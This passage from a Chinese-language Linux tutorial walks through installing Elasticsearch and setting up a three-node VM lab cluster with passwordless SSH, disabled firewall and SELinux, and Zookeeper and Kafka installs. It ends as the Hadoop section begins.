<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root执行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入仓库密钥</span></span><br><span class="line">rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加yum源</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑文件</span> </span><br><span class="line">vim /etc/yum.repos.d/elasticsearch.repo</span><br><span class="line"></span><br><span class="line">[elasticsearch-7.x]</span><br><span class="line">name=Elasticsearch repository for 7.x packages</span><br><span class="line">baseurl=https://artifacts.elastic.co/packages/7.x/yum</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch</span><br><span class="line">enabled=1</span><br><span class="line">autorefresh=1</span><br><span class="line">type=rpm-md</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新yum缓存</span></span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure>

<ul>
<li>安装es</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y elasticsearch</span><br></pre></td></tr></table></figure>

<ul>
<li>配置es</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/elasticsearch/elasticsearch.yml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">17行，设置集群名称</span></span><br><span class="line">cluster.name: my-cluster</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">23行，设置节点名称</span></span><br><span class="line">node.name: node-1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">56行，允许外网访问</span></span><br><span class="line">network.host: 0.0.0.0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">74行，配置集群master节点</span></span><br><span class="line">cluster.initial_master_nodes: [&quot;node-1&quot;]</span><br></pre></td></tr></table></figure>

<ul>
<li>启动es</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start | stop | status | enable | disable elasticsearch</span><br></pre></td></tr></table></figure>

<ul>
<li>关闭防火墙</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br></pre></td></tr></table></figure>

<ul>
<li>测试<br>浏览器打开：<a href="http://ip:9200/?pretty">http://ip:9200/?pretty</a></li>
</ul>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/esOne.png"></p>
<h2 id="集群化环境前置准备"><a href="#集群化环境前置准备" class="headerlink" title="集群化环境前置准备"></a>集群化环境前置准备</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在前面，我们所学习安装的软件，都是以单机模式运行的。</p>
<p>后续，我们将要学习大数据相关的软件部署，所以后续我们所安装的软件服务，大多数都是以集群化（多台服务器共同工作）模式运行的。</p>
<p>所以，在当前小节，我们需要完成集群化环境的前置准备，包括创建多台虚拟机，配置主机名映射，SSH免密登录等等</p>
<h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><h4 id="配置多台Linux虚拟机"><a href="#配置多台Linux虚拟机" class="headerlink" title="配置多台Linux虚拟机"></a>配置多台Linux虚拟机</h4><p>安装集群化软件，首要条件就是要有多台Linux服务器可用。</p>
<p>我们可以使用VMware提供的克隆功能，将我们的虚拟机额外克隆出3台来使用。</p>
<ul>
<li><p>首先，关机当前CentOS系统虚拟机（可以使用root用户执行init 0来快速关机）</p>
</li>
<li><p>新建文件夹<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/jiqunOne.png"><br>文件夹起名为：虚拟机集群</p>
</li>
<li><p>克隆<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/jiqunTwo.png"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/jinqunThree.png"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/jiqunFour.png"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/jiqunFive.png"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/jiqunSix.png"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/jiqunSeven.png"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/jiqunEight.png"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/jiqunNine.png"></p>
</li>
<li><p>同样的操作克隆出：node2和node3<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/jiqunTen.png"></p>
</li>
<li><p>开启node1，修改主机名为node1，并修改固定ip为：192.168.88.131</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改主机名</span></span><br><span class="line">hostnamectl set-hostname node1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改IP地址</span></span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">IPADDR=&quot;192.168.88.131&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启网卡</span></span><br><span class="line">systemctl stop network</span><br><span class="line">systemctl start network</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者直接</span></span><br><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>

<ul>
<li>同样的操作启动node2和node3<br>修改node2主机名为node2，设置ip为192.168.88.132</li>
</ul>
<p>修改node2主机名为node3，设置ip为192.168.88.133</p>
<ul>
<li>配置FinalShell，配置连接到node1、node2、node3的连接<blockquote>
<p>为了简单起见，建议配置root用户登录</p>
</blockquote>
</li>
</ul>
<h4 id="准备主机名映射"><a href="#准备主机名映射" class="headerlink" title="准备主机名映射"></a>准备主机名映射</h4><ul>
<li>在Windows系统中修改hosts文件，填入如下内容：</li>
</ul>
<blockquote>
<p>如果使用MacOS系统，请：</p>
</blockquote>
<p>sudo su -，切换到root<br>修改&#x2F;etc&#x2F;hosts文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.88.131 node1</span><br><span class="line">192.168.88.132 node2</span><br><span class="line">192.168.88.133 node3</span><br></pre></td></tr></table></figure>

<ul>
<li>在3台Linux的&#x2F;etc&#x2F;hosts文件中，填入如下内容（&#x3D;&#x3D;3台都要添加&#x3D;&#x3D;）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.88.131 node1</span><br><span class="line">192.168.88.132 node2</span><br><span class="line">192.168.88.133 node3</span><br></pre></td></tr></table></figure>

<h4 id="配置SSH免密登录"><a href="#配置SSH免密登录" class="headerlink" title="配置SSH免密登录"></a>配置SSH免密登录</h4><h5 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h5><p>SSH服务是一种用于远程登录的安全认证协议。</p>
<p>我们通过FinalShell远程连接到Linux，就是使用的SSH服务。</p>
<p>SSH服务支持：</p>
<ul>
<li>通过账户+密码的认证方式来做用户认证</li>
<li>通过账户+秘钥文件的方式做用户认证<br>SSH可以让我们通过SSH命令，远程的登陆到其它的主机上，比如：</li>
</ul>
<p>在node1执行：ssh root@node2，将以root用户登录node2服务器，输入密码即可成功登陆</p>
<p>或者ssh node2，将以当前用户直接登陆到node2服务器。</p>
<h5 id="SSH免密配置"><a href="#SSH免密配置" class="headerlink" title="SSH免密配置"></a>SSH免密配置</h5><p>后续安装的集群化软件，多数需要远程登录以及远程执行命令，我们可以简单起见，配置三台Linux服务器之间的免密码互相SSH登陆</p>
<ul>
<li><p>在每一台机器都执行：ssh-keygen -t rsa -b 4096，一路回车到底即可</p>
</li>
<li><p>在每一台机器都执行：</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-copy-id node1</span><br><span class="line">ssh-copy-id node2</span><br><span class="line">ssh-copy-id node3</span><br></pre></td></tr></table></figure>

<ul>
<li>执行完毕后，node1、node2、node3之间将完成root用户之间的免密互通</li>
</ul>
<h4 id="配置JDK环境"><a href="#配置JDK环境" class="headerlink" title="配置JDK环境"></a>配置JDK环境</h4><p>后续的大数据集群软件，多数是需要Java运行环境的，所以我们为&#x3D;&#x3D;每一台&#x3D;&#x3D;机器都配置JDK环境。</p>
<p>JDK配置参阅：Tomcat安装部署环节。</p>
<h4 id="关闭防火墙和SELinux"><a href="#关闭防火墙和SELinux" class="headerlink" title="关闭防火墙和SELinux"></a>关闭防火墙和SELinux</h4><p>集群化软件之间需要通过端口互相通讯，为了避免出现网络不通的问题，我们可以简单的在集群内部关闭防火墙。</p>
<p>&#x3D;&#x3D;在每一台机器都执行&#x3D;&#x3D;</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br></pre></td></tr></table></figure>
<p>Linux有一个安全模块：SELinux，用以限制用户和程序的相关权限，来确保系统的安全稳定。</p>
<p>SELinux的配置同防火墙一样，非常复杂，课程中不多涉及，后续视情况可以出一章SELinux的配置课程。</p>
<p>在当前，我们只需要关闭SELinux功能，避免导致后面的软件运行出现问题即可，</p>
<p>&#x3D;&#x3D;在每一台机器都执行&#x3D;&#x3D;</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/selinux</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将第七行，SELINUX=enforcing 改为</span></span><br><span class="line">SELINUX=disabled</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">保存退出后，重启虚拟机即可，千万要注意disabled单词不要写错，不然无法启动系统</span></span><br></pre></td></tr></table></figure>

<h4 id="添加快照"><a href="#添加快照" class="headerlink" title="添加快照"></a>添加快照</h4><p>为了避免后续出现问题，在完成上述设置后，为&#x3D;&#x3D;每一台虚拟机&#x3D;&#x3D;都制作快照，留待使用。</p>
<h3 id="补充命令-scp"><a href="#补充命令-scp" class="headerlink" title="补充命令 - scp"></a>补充命令 - scp</h3><p>后续的安装部署操作，我们将会频繁的在多台服务器之间相互传输数据。</p>
<p>为了更加方面的互相传输，我们补充一个命令：scp</p>
<p>scp命令是cp命令的升级版，即：ssh cp，通过SSH协议完成文件的复制。</p>
<p>其主要的功能就是：在不同的Linux服务器之间，通过SSH协议互相传输文件。</p>
<p>只要知晓服务器的账户和密码（或密钥），即可通过SCP互传文件。</p>
<p>语法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp [-r] 参数1 参数2</span><br><span class="line">- -r选项用于复制文件夹使用，如果复制文件夹，必须使用-r</span><br><span class="line">- 参数1：本机路径 或 远程目标路径</span><br><span class="line">- 参数2：远程目标路径 或 本机路径</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line">scp -r /export/server/jdk root@node2:/export/server/</span><br><span class="line">将本机上的jdk文件夹， 以root的身份复制到node2的/export/server/内</span><br><span class="line">同SSH登陆一样，账户名可以省略（使用本机当前的同名账户登陆）</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line">scp -r node2:/export/server/jdk /export/server/</span><br><span class="line">将远程node2的jdk文件夹，复制到本机的/export/server/内</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">scp命令的高级用法</span></span><br><span class="line">cd /export/server</span><br><span class="line">scp -r jdk node2:`pwd`/    # 将本机当前路径的jdk文件夹，复制到node2服务器的同名路径下</span><br><span class="line">scp -r jdk node2:$PWD      # 将本机当前路径的jdk文件夹，复制到node2服务器的同名路径下</span><br></pre></td></tr></table></figure>

<h2 id="Zookeeper集群安装部署"><a href="#Zookeeper集群安装部署" class="headerlink" title="Zookeeper集群安装部署"></a>Zookeeper集群安装部署</h2><h3 id="简介-6"><a href="#简介-6" class="headerlink" title="简介"></a>简介</h3><p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p>
<p>除了为Hadoop和HBase提供协调服务外，Zookeeper也被其它许多软件采用作为其分布式状态一致性的依赖，比如Kafka，又或者一些软件项目中，也经常能见到Zookeeper作为一致性协调服务存在。</p>
<p>Zookeeper不论是大数据领域亦或是其它服务器开发领域，涉及到分布式状态一致性的场景，总有它的身影存在。</p>
<h3 id="安装-8"><a href="#安装-8" class="headerlink" title="安装"></a>安装</h3><p>Zookeeper是一款分布式的集群化软件，可以在多台服务器上部署，并协同组成分布式集群一起工作。</p>
<ul>
<li><p>首先，要确保已经完成了集群化环境前置准备环节的全部内容</p>
</li>
<li><p>【node1上操作】下载Zookeeper安装包，并解压</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载</span></span><br><span class="line">wget http://archive.apache.org/dist/zookeeper/zookeeper-3.5.9/apache-zookeeper-3.5.9-bin.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确保如下目录存在，不存在就创建</span></span><br><span class="line">mkdir -p /export/server</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">tar -zxvf apache-zookeeper-3.5.9-bin.tar.gz -C /export/server</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1上操作】创建软链接</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /export/server/apache-zookeeper-3.5.9 /export/server/zookeeper</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1上操作】修改配置文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /export/server/zookeeper/conf/zoo.cfg</span><br><span class="line"></span><br><span class="line">tickTime=2000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">zookeeper数据存储目录</span></span><br><span class="line">dataDir=/export/server/zookeeper/data</span><br><span class="line">clientPort=2181</span><br><span class="line">initLimit=5</span><br><span class="line">syncLimit=2</span><br><span class="line">server.1=node1:2888:3888</span><br><span class="line">server.2=node2:2888:3888</span><br><span class="line">server.3=node3:2888:3888</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1上操作】配置myid</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 创建Zookeeper的数据目录</span></span><br><span class="line">mkdir /export/server/zookeeper/data</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 创建文件，并填入1</span></span><br><span class="line">vim /export/server/zookeeper/data/myid</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在文件内填入1即可</span></span><br></pre></td></tr></table></figure>

<ul>
<li>【在node2和node3上操作】，创建文件夹</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /export/server</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1上操作】将Zookeeper 复制到node2和node3</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /export/server</span><br><span class="line"></span><br><span class="line">scp -r apache-zookeeper-3.5.9 node2:`pwd`/</span><br><span class="line">scp -r apache-zookeeper-3.5.9 node3:`pwd`/</span><br></pre></td></tr></table></figure>

<ul>
<li>【在node2上操作】</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 创建软链接</span></span><br><span class="line">ln -s /export/server/apache-zookeeper-3.5.9 /export/server/zookeeper</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 修改myid文件</span></span><br><span class="line">vim /export/server/zookeeper/data/myid</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改内容为2</span></span><br></pre></td></tr></table></figure>

<ul>
<li>【在node3上操作】</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 创建软链接</span></span><br><span class="line">ln -s /export/server/apache-zookeeper-3.5.9 /export/server/zookeeper</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 修改myid文件</span></span><br><span class="line">vim /export/server/zookeeper/data/myid</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改内容为3</span></span><br></pre></td></tr></table></figure>

<ul>
<li>【在node1、node2、node3上分别执行】启动Zookeeper</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动命令</span></span><br><span class="line">/export/server/zookeeper/bin/zkServer.sh start		# 启动Zookeeper</span><br></pre></td></tr></table></figure>

<ul>
<li>【在node1、node2、node3上分别执行】检查Zookeeper进程是否启动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jps</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结果中找到有：QuorumPeerMain 进程即可</span></span><br></pre></td></tr></table></figure>
<ul>
<li>【node1上操作】验证Zookeeper</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/export/server/zookeeper/zkCli.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入到Zookeeper控制台中后，执行</span></span><br><span class="line">ls /</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如无报错即配置成功</span></span><br></pre></td></tr></table></figure>

<p>至此Zookeeper安装完成</p>
<h2 id="Kafka集群安装部署"><a href="#Kafka集群安装部署" class="headerlink" title="Kafka集群安装部署"></a>Kafka集群安装部署</h2><h3 id="简介-7"><a href="#简介-7" class="headerlink" title="简介"></a>简介</h3><p>Kafka是一款分布式的、去中心化的、高吞吐低延迟、订阅模式的消息队列系统。</p>
<p>同RabbitMQ一样，Kafka也是消息队列。不过RabbitMQ多用于后端系统，因其更加专注于消息的延迟和容错。</p>
<p>Kafka多用于大数据体系，因其更加专注于数据的吞吐能力。</p>
<p>Kafka多数都是运行在分布式（集群化）模式下，所以课程将以3台服务器，来完成Kafka集群的安装部署。</p>
<h3 id="安装-9"><a href="#安装-9" class="headerlink" title="安装"></a>安装</h3><ul>
<li><p>确保已经跟随前面的学习，安装并部署了JDK和Zookeeper服务</p>
<blockquote>
<p>Kafka的运行依赖JDK环境和Zookeeper请确保已经有了JDK环境和Zookeeper</p>
</blockquote>
</li>
<li><p>【在node1操作】下载并上传Kafka的安装包</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载安装包</span></span><br><span class="line">wget http://archive.apache.org/dist/kafka/2.4.1/kafka_2.12-2.4.1.tgz</span><br></pre></td></tr></table></figure>

<ul>
<li>【在node1操作】解压</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /export/server			# 此文件夹如果不存在需先创建</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">tar -zxvf kafka_2.12-2.4.1.tgz -C /export/server/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建软链接</span></span><br><span class="line">ln -s /export/server/kafka_2.12-2.4.1 /export/server/kafka</span><br></pre></td></tr></table></figure>

<ul>
<li>【在node1操作】修改Kafka目录内的config目录内的server.properties文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /export/server/kafka/config</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定broker的<span class="built_in">id</span></span></span><br><span class="line">broker.id=1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定 kafka的绑定监听的地址</span></span><br><span class="line">listeners=PLAINTEXT://node1:9092</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定Kafka数据的位置</span></span><br><span class="line">log.dirs=/export/server/kafka/data</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定Zookeeper的三个节点</span></span><br><span class="line">zookeeper.connect=node1:2181,node2:2181,node3:2181</span><br></pre></td></tr></table></figure>

<ul>
<li>【在node1操作】将node1的kafka复制到node2和node3</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /export/server</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制到node2同名文件夹</span></span><br><span class="line">scp -r kafka_2.12-2.4.1 node2:`pwd`/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制到node3同名文件夹</span></span><br><span class="line">scp -r kafka_2.12-2.4.1 node3:$PWD</span><br></pre></td></tr></table></figure>

<ul>
<li>【在node2操作】</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建软链接</span></span><br><span class="line">ln -s /export/server/kafka_2.12-2.4.1 /export/server/kafka</span><br><span class="line"></span><br><span class="line">cd /export/server/kafka/config</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定broker的<span class="built_in">id</span></span></span><br><span class="line">broker.id=2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定 kafka的绑定监听的地址</span></span><br><span class="line">listeners=PLAINTEXT://node2:9092</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定Kafka数据的位置</span></span><br><span class="line">log.dirs=/export/server/kafka/data</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定Zookeeper的三个节点</span></span><br><span class="line">zookeeper.connect=node1:2181,node2:2181,node3:2181</span><br></pre></td></tr></table></figure>

<ul>
<li>【在node3操作】</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建软链接</span></span><br><span class="line">ln -s /export/server/kafka_2.12-2.4.1 /export/server/kafka</span><br><span class="line"></span><br><span class="line">cd /export/server/kafka/config</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定broker的<span class="built_in">id</span></span></span><br><span class="line">broker.id=3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定 kafka的绑定监听的地址</span></span><br><span class="line">listeners=PLAINTEXT://node3:9092</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定Kafka数据的位置</span></span><br><span class="line">log.dirs=/export/server/kafka/data</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定Zookeeper的三个节点</span></span><br><span class="line">zookeeper.connect=node1:2181,node2:2181,node3:2181</span><br></pre></td></tr></table></figure>

<ul>
<li>启动kafka</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">请先确保Zookeeper已经启动了</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方式1：【前台启动】分别在node1、2、3上执行如下语句</span></span><br><span class="line">/export/server/kafka/bin/kafka-server-start.sh /export/server/kafka/config/server.properties</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方式2：【后台启动】分别在node1、2、3上执行如下语句</span></span><br><span class="line">nohup /export/server/kafka/bin/kafka-server-start.sh /export/server/kafka/config/server.properties 2&gt;&amp;1 &gt;&gt; /export/server/kafka/kafka-server.log &amp;</span><br></pre></td></tr></table></figure>

<ul>
<li>验证Kafka启动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在每一台服务器执行</span></span><br><span class="line">jps</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/kafkaOne.png"></p>
<h3 id="测试Kafka能否正常使用"><a href="#测试Kafka能否正常使用" class="headerlink" title="测试Kafka能否正常使用"></a>测试Kafka能否正常使用</h3><ul>
<li>创建测试主题</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在node1执行，创建一个主题</span></span><br><span class="line">/export/server/kafka_2.12-2.4.1/bin/kafka-topics.sh --create --zookeeper node1:2181 --replication-factor 1 --partitions 3 --topic test</span><br></pre></td></tr></table></figure>

<ul>
<li>运行测试，请在FinalShell中打开2个node1的终端页面</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打开一个终端页面，启动一个模拟的数据生产者</span></span><br><span class="line">/export/server/kafka_2.12-2.4.1/bin/kafka-console-producer.sh --broker-list node1:9092 --topic test</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再打开一个新的终端页面，在启动一个模拟的数据消费者</span></span><br><span class="line">/export/server/kafka_2.12-2.4.1/bin/kafka-console-consumer.sh --bootstrap-server node1:9092 --topic test --from-beginning</span><br></pre></td></tr></table></figure>

<h2 id="大数据集群（Hadoop生态）安装部署"><a href="#大数据集群（Hadoop生态）安装部署" class="headerlink" title="大数据集群（Hadoop生态）安装部署"></a>大数据集群（Hadoop生态）安装部署</h2><h3 id="简介-8"><a href="#简介-8" class="headerlink" title="简介"></a>简介</h3><p>1）Hadoop是一个由Apache基金会所开发的分布式系统基础架构。<br>2）主要解决，海量数据的存储和海量数据的分析计算问题。</p>
<p>Hadoop HDFS 提供分布式海量数据存储能力</p>
<p>Hadoop YARN 提供分布式集群资源管理能力</p>
<p>Hadoop MapReduce 提供分布式海量数据计算能力</p>
<h4 id="前置要求"><a href="#前置要求" class="headerlink" title="前置要求"></a>前置要求</h4><p>请确保完成了集群化环境前置准备章节的内容<br>即：JDK、SSH免密、关闭防火墙、配置主机名映射等前置操作</p>
<h4 id="Hadoop集群角色"><a href="#Hadoop集群角色" class="headerlink" title="Hadoop集群角色"></a>Hadoop集群角色</h4><p>Hadoop生态体系中总共会出现如下进程角色：</p>
<p>Hadoop HDFS的管理角色：Namenode进程（仅需1个即可（管理者一个就够））<br>Hadoop HDFS的工作角色：Datanode进程（需要多个（工人，越多越好，一个机器启动一个））<br>Hadoop YARN的管理角色：ResourceManager进程（仅需1个即可（管理者一个就够））<br>Hadoop YARN的工作角色：NodeManager进程（需要多个（工人，越多越好，一个机器启动一个））<br>Hadoop 历史记录服务器角色：HistoryServer进程（仅需1个即可（功能进程无需太多1个足够））<br>Hadoop 代理服务器角色：WebProxyServer进程（仅需1个即可（功能进程无需太多1个足够））<br>Zookeeper的进程：QuorumPeerMain进程（仅需1个即可（Zookeeper的工作者，越多越好））</p>
<h4 id="角色和节点分配"><a href="#角色和节点分配" class="headerlink" title="角色和节点分配"></a>角色和节点分配</h4><p>角色分配如下：</p>
<ul>
<li>node1:Namenode、Datanode、ResourceManager、NodeManager、HistoryServer、WebProxyServer、QuorumPeerMain</li>
<li>node2:Datanode、NodeManager、QuorumPeerMain</li>
<li>node3:Datanode、NodeManager、QuorumPeerMain<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/hadoopOne.png"></li>
</ul>
<h3 id="安装-10"><a href="#安装-10" class="headerlink" title="安装"></a>安装</h3><h4 id="调整虚拟机内存"><a href="#调整虚拟机内存" class="headerlink" title="调整虚拟机内存"></a>调整虚拟机内存</h4><p>如上图，可以看出node1承载了太多的压力。同时node2和node3也同时运行了不少程序</p>
<p>为了确保集群的稳定，需要对虚拟机进行内存设置。</p>
<p>请在VMware中，对：</p>
<ul>
<li>node1设置4GB或以上内存</li>
<li>node2和node3设置2GB或以上内存</li>
</ul>
<blockquote>
<p>大数据的软件本身就是集群化（一堆服务器）一起运行的。</p>
</blockquote>
<p>现在我们在一台电脑中以多台虚拟机来模拟集群，确实会有很大的内存压力哦。</p>
<h4 id="Hadoop集群部署"><a href="#Hadoop集群部署" class="headerlink" title="Hadoop集群部署"></a>Hadoop集群部署</h4><ul>
<li>下载Hadoop安装包、解压、配置软链接</li>
</ul>
